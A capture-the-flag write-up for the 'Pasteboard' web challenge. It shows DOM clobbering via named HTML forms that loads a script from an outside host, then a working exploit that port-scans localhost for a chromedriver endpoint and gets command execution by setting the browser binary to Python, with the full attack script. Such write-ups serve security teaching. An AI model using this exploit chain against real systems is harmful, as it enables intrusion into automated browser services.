---
created: 2026-01-09T22:12
updated: 2026-01-12T00:06
solves: 31
points: 140
title: Pasteboard
description: window.formname + selenium dark magic RCE
---

## XSS

First lets check if the DOMPurify is pure.

```bash
diff dompurify.min.js purify.min.js
3c3
< //# sourceMappingURL=purify.min.js.map
\ No newline at end of file
---
> //# sourceMappingURL=purify.min.js.map
```

Next I analyzed the files briefly and came across this.

```js [app.js]
const c = window.errorReporter || { path: "/telemetry/error-reporter.js" };
const p = c.path && c.path.value
  ? c.path.value
  : String(c.path || "/telemetry/error-reporter.js");
const s = document.createElement("script");
s.id = "errorReporterScript";
let src = p;
try {
  src = new URL(p).href;
} catch (err) {
  src = p.startsWith("/") ? p : "/telemetry/" + p;
}
s.src = src;

if (el) {
  el.replaceWith(s);
} else {
  document.head.appendChild(s);
}
```

The script `app.js` loads some error reporter script, but it might use `window.errorReporter.path.value` if it exists.

Well funny enough, HTML forms with a name are actually attributes inside `window`.

```html
<form name="errorReporter">
	<input name="path" value="https://8080.yun.ng/s.js">
</form>
<!-- window.errorReporter.path.value is now "https://8080.yun.ng/s.js" -->
```

To trigger this error reporting function, we need to make the following code throw some error.

```js
const cfg = window.renderConfig || { mode: (card && card.dataset.mode) || "safe" };
const mode = cfg.mode.toLowerCase();
const clean = DOMPurify.sanitize(raw, { ALLOW_DATA_ATTR: false });
if (card) {
  card.innerHTML = clean;
}
if (mode !== "safe") {
  console.log("Render mode:", mode);
}
```

We can repeat the samething as before with

```html
<form name="renderConfig">
<input name="mode">
</form>
```

There is no `toLowerCase` on `HTMLElement` so it errors.

## rce

Now we have XSS on the bot, how do we read the flag?

```python
import time

from selenium import webdriver
from selenium.webdriver.chrome.options import Options

BASE_URL = "http://127.0.0.1:5000"
FLAG = "uoftctf{fake_flag}"

def visit_url(target_url):
    options = Options()
    options.add_argument("--headless=true")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=options)
    try:
        driver.get(target_url)
        time.sleep(30)
    finally:
        driver.quit()
```

The bot's code is so simple and I have no idea.

@aelmo came to the rescue and pull out some dark magic local port scanning selenium RCE.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1768194251/20260112000411715.png/972848d3c3ec8a1de7bee3ffc3b33646.png)

After a bunch of dumb mistakes, fiddling with exfiltration payload and things later, @aelmo found the right RCE payload which is just move `bot.py` into `static` and solved the challenge.

```python
from time import sleep
import requests
from server import serve_file

target = "http://127.0.0.1:5000"
target = "https://pasteboard-341f2798917f60f4.chals.uoftctf.org"


js = b"""
fetch('https://8080.yun.ng/starting')
try{
const options = {
  mode: "no-cors",
  method: "POST",
  body: JSON.stringify({
    capabilities: {
      alwaysMatch: {
        "goog:chromeOptions": {
          binary: "/usr/local/bin/python",
          args: [
            "-c",
            '__import__("os").system("mv /app/bot.py /app/static")',
          ],
        },
      },
    },
  }),
};

for (let port = 32768; port < 61000; port++) {
  fetch(`http://127.0.0.1:${port}/session`, options);
  if (port % 1000 === 0) {
    fetch('https://8080.yun.ng/done'+port)
  }
  console.log(port);
}
}catch(e){
fetch('https://8080.yun.ng/error?'+e.message)
}
fetch('https://8080.yun.ng/done_all_requests')
"""

stop = serve_file(js, 8080, "text/javascript")


payload = """
<form name="renderConfig">
<input name="mode">
</form>
<form name="errorReporter">
<input name="path" value="https://8080.yun.ng/s.js">
</form>
"""
r = requests.post(f"{target}/note/new", data={
    "title": "hello",
    "body": payload
})
id = r.url.split("/")[-1]
print("reporting")
requests.post(f"{target}/report", data={
    "url": f"http://127.0.0.1:5000/note/{id}"
})

while True:
    sleep(1)
    t = requests.get(f"{target}/static/bot.py")
    if t.ok:
        print(t.text)
        break


stop()
```

```flag
uoftctf{n0_c00k135_n0_pr0bl3m_1m40_122c3466655003ca64d689e3ee0e786d}
```
